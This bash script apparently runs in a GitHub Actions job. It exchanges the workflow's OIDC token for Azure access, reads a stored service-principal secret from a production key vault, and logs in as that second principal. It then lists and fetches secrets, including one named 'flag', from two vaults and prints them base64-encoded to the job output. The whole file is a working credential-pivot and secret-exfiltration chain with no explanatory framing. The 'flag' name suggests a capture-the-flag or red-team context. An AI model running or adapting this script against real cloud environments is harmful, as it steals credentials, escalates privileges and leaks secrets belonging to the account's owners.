#!/usr/bin/env bash
set -euo pipefail
T="${AZURE_TENANT_ID:?}"; C="${AZURE_CLIENT_ID:?}"; PROD='https://kv-tbl-prod-x3euoz.vault.azure.net'; say(){ echo "$*"; }
J=$(curl -sS --max-time 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
B=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d "client_id=$C" -d 'grant_type=client_credentials' -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' -d "client_assertion=$J" -d 'scope=https://vault.azure.net/.default' | jq -r '.access_token // empty')
S=$(curl -sS --max-time 20 -H "Authorization: Bearer $B" "$PROD/secrets/cost-reader-principal?api-version=7.4")
A=$(echo "$S"|jq -r '.value|fromjson|.appId // empty'); P=$(echo "$S"|jq -r '.value|fromjson|.clientSecret // empty'); TT=$(echo "$S"|jq -r '.value|fromjson|.tenantId // empty')
AT=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$TT/oauth2/v2.0/token" -d "client_id=$A" -d 'grant_type=client_credentials' -d "client_secret=$P" -d 'scope=https://management.azure.com/.default' | jq -r '.access_token // empty')
for v in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
 U="https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/$v"
 for path in 'secrets?api-version=2023-07-01' 'secrets/flag?api-version=2023-07-01'; do
  code=$(curl -sS --max-time 20 -o /tmp/q -w '%{http_code}' -H "Authorization: Bearer $AT" "$U/$path" || echo 000)
  say "Q_${v}_${path//\//_}=$code"
  [[ "$code" == "200" ]] && say "Q_${v}_${path//\//_}_B64=$(base64 -w0 </tmp/q)"
 done
done
say DONE
